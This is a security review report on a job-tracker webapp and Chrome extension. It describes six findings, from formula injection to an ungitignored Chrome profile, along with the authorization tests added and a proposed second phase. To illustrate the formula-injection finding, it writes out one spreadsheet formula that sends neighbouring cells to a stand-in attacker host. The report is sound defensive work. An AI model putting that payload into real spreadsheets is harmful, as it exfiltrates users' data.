# Security Review — Phase 1 (static + authorization)

**Date:** 2026-09-22
**Scope:** `job-tracker-extension/pro` (Next.js webapp, Supabase Postgres) and `JOB TRACKER` (Chrome MV3 extension)
**Method:** source review of every route handler, RLS policy and migration; secret/config audit; git history review; dependency audit; authorization tests executed against the real migrations in an in-process Postgres.
**Not in scope:** live traffic, production exploitation, third-party services.

---

## Summary

| ID | Finding | Severity | Status |
|----|---------|----------|--------|
| F1 | Formula injection into the user's Google Sheet via `USER_ENTERED` | Medium | Open — needs fix |
| F2 | `/api/google/sheets/tabs` accepts any `spreadsheetId` | Low–Medium | Open — needs fix |
| F3 | Four handlers scope by primary key only, relying entirely on RLS | Low (defense in depth) | Verified safe today; harden |
| F4 | `/api/gmail/scan` has no rate limiting, 300s max duration | Low–Medium | Open |
| F5 | Chrome profile with cookies/Login Data untracked, not gitignored | Medium (latent) | Open — 1-line fix |
| F6 | Removed debug endpoints were unauthenticated; picker API key prefix in public history | Low (historical) | Verify deployment; consider rotation |

**No High or Critical findings.** No secrets were found in either repository, and the dependency audit is clean.

---

## What passed (verified, not assumed)

These are proven by tests that run the real migrations in Postgres:

- **RLS is enabled on all six tables**, and every command granted to `authenticated` has a matching policy. A future migration that adds a table without RLS now fails the suite.
- **`anon` is locked out of every table.** All grants were revoked; both reads and writes are denied.
- **Cross-user isolation holds on all six tables** — reads, updates and deletes.
- **Cross-tenant foreign keys cannot be stitched together.** Every link is a composite `(id, user_id)` FK, so knowing another user's row ids is not enough to attach rows to them.
- **`user_id` spoofing on insert is rejected** by RLS `WITH CHECK` on every table.
- **`profiles.id` cannot be rewritten** — blocked by the row-level `WITH CHECK`, with the column-level grant as a second layer.
- **`import_sheet_application` refuses another user's connection id** even though `authenticated` may execute it.
- **`anon` cannot execute the SECURITY DEFINER profile trigger.**
- Positive controls confirm the tests are not passing on an empty database.

Two implementation notes worth recording, because both are genuinely well-built:

- The 9-argument `import_sheet_application` created in `202609180002` correctly re-applied `revoke ... from public, anon` after the 8-argument version was dropped. It is easy to lose grants when replacing a function; that did not happen here.
- `describeKey()` in the removed `debug-env` route deliberately reported key *type* without ever printing a key value. The debug endpoint was designed with care.

**Dependency audit:** `npm audit` reports **0 vulnerabilities** across 72 dependencies, production and dev.

**Secrets:** `.env*` is gitignored, only `.env.example` is tracked, no service-role key or Supabase JWT was ever committed, and the extension repo contains no secrets. The OAuth `client_id` in `manifest.json` is public by design, not a leak.

---

## Findings

### F1 — Formula injection into the user's Google Sheet (Medium)

**Where:** `popup.js` → `appendRow()` (line ~747) and `row` construction (line ~332)

```js
const url = `.../values/${range}:append?valueInputOption=USER_ENTERED&...`;
const row = [dateValue, details.company, details.role, link, "Applied", details.source, "", "", ""];
```

**Why it matters:** `USER_ENTERED` tells Google to *parse* the value as if the user typed it. `details.company` and `details.role` come from `extractFromPage()`, which reads `textContent` from the active job-posting page — content controlled by whoever published that listing. A company name beginning with `=`, `+`, `-` or `@` becomes a live formula in the user's own spreadsheet. `=IMPORTXML("https://attacker.tld/?"&A1,"//x")` exfiltrates neighbouring cells to an external host; `=HYPERLINK()` is a convincing phishing vector.

**Fix:** keep `USER_ENTERED` (it is what gives you real dates and status colours) but neutralise the text columns — prefix a leading formula character with an apostrophe, or strip/replace `= + - @` at the start of the value before it is written. `sync.ts` is not affected: it only writes a validated enum value.

### F2 — `/api/google/sheets/tabs` accepts an arbitrary spreadsheet id (Low–Medium)

**Where:** `src/app/api/google/sheets/tabs/route.ts`

The handler authenticates the user and then passes the client-supplied `spreadsheetId` straight to Google with the user's token, without checking it against that user's saved `sheet_connections` row. The endpoint therefore acts as a read proxy for any spreadsheet the presented token can reach, and returns the file's title.

**Why it is only Low–Medium:** the token is issued with the `drive.file` scope, which limits access to files the user explicitly picked through the Google Picker, and it is the caller's own token — so this cannot cross account boundaries. It becomes significantly more interesting if a broader scope is ever requested.

**Fix:** look the id up in `sheet_connections` for the calling user and reject anything not saved, or have the client send the connection id instead of the spreadsheet id.

### F3 — Handlers scope by primary key only (Low, defense in depth)

**Where:** `PATCH` + `DELETE` in `applications/[id]/route.ts`, `POST` in `applications/[id]/follow-up/route.ts`, `DELETE` in `import-issues/[id]/route.ts`

These read or write with `.eq('id', id)` and no `.eq('user_id', user.id)`, while other handlers in the same codebase do both. Authorization therefore rests on a single control layer.

**Verified safe today** — the test suite proves each of these query shapes returns zero rows for a second user. But if RLS were ever disabled, or one policy dropped, these become straight IDOR. `DELETE /api/import-issues/[id]` is incidentally protected twice, since `import_issues` has no `UPDATE`/extra grants at all.

**Fix:** add `.eq('user_id', user.id)` to each of those four queries. Defence in depth — the database stays the primary control, the query becomes the second.

### F4 — Gmail scan is unmetered (Low–Medium)

**Where:** `src/app/api/gmail/scan/route.ts` (`maxDuration = 300`)

Any authenticated user can trigger an unbounded number of 5-minute scans, each consuming Gmail quota and serverless time, with no per-user limit. The endpoint does correctly verify via `tokeninfo` that the presented token actually carries `gmail.readonly` before spending quota — that part is right.

**Fix:** per-user rate limit (count or time window), or cap concurrent scans.

*Minor, same file:* the token is passed to Google's `tokeninfo` endpoint in a query string, so it can land in logs. Google's endpoint supports a POST body or `Authorization` header; prefer those.

### F5 — Chrome profile untracked and not gitignored (Medium, latent)

**Where:** `promo/chrome-profile/`

`git check-ignore` confirms this directory is **not ignored**. It is currently untracked, which is the only reason it has not been committed. It contains a complete Chrome profile — `Login Data`, `Extension Cookies`, `History`, `Local State`. A single `git add -A` would commit live credentials into a public repository, and a pushed secret cannot be un-pushed.

**Fix:** add `promo/chrome-profile/` to `.gitignore` now. Also consider the other untracked promo artifacts (`*.mp4`, `__pycache__/`, audio renders) — the same one-line change can cover the ones you do not want in history.

### F6 — Removed debug endpoints (Low, historical)

`/api/debug-env` and `/api/debug-oauth` existed in commits `4990aee` and `0c6c7ee` and were removed in `d361fca`. Both were **unauthenticated**, so on the public deployment anyone could enumerate infrastructure details: `APP_URL`, Supabase hostname, environment names, the anon key's `role` claim, the first 16 characters of the Google OAuth client id, and the first 8 characters of the Google Picker API key. No secret value was ever returned.

**Actions:** confirm `d361fca` is deployed to Vercel (the routes should 404), and consider rotating `GOOGLE_PICKER_API_KEY` since part of it is in public git history. The empty `src/app/api/debug-env/` and `debug-oauth/` directories are leftovers and can be deleted.

---

## What you need to run

`supabase/tests/security_rls_phase1.sql` — paste into the Supabase SQL Editor. It is wrapped in a single transaction and rolls back, so it is safe against production data. Everything is validated against PGlite first, so it should run clean.

It covers the hosted-side checks that PGlite cannot, and independently confirms the RLS posture of the live database. It ends with a query listing the `application_stage` enum values — **that is the pending verification of `202609200002_application_stage_replied`**. The value `Replied` must appear in the output. If it does not, the webapp's stage allowlist and the database disagree, and both `PATCH /api/applications/[id]` and the follow-up route will fail with a 500 for that stage.

## Regression tests added

| File | Purpose |
|------|---------|
| `tests/security-rls.test.mjs` | 11 authorization tests against the real migrations |
| `tests/security-rls-hosted-sql.test.mjs` | runs the hosted SQL script end-to-end so it cannot break unnoticed |

Test suite: **77/77 passing** (was 64). Typecheck clean.

## Proposed Phase 2

Static analysis is done and authorization is verified. The remaining work is dynamic and needs a test environment:

1. Container/pattern checks not reachable by source review — security headers, CSP, cookie flags as actually sent.
2. Authenticated abuse of each state-changing route against a **test Supabase project**: tampered ids, replayed tokens, malformed and oversized payloads, cross-origin requests.
3. Formula injection reproduced end-to-end to confirm F1's real impact.
4. Extension review: message-passing boundaries, `chrome.scripting` target scoping, storage contents.

Phase 2 needs a test account and a non-production Supabase project. No hosted database access is required from me — any SQL continues to come to you to run.
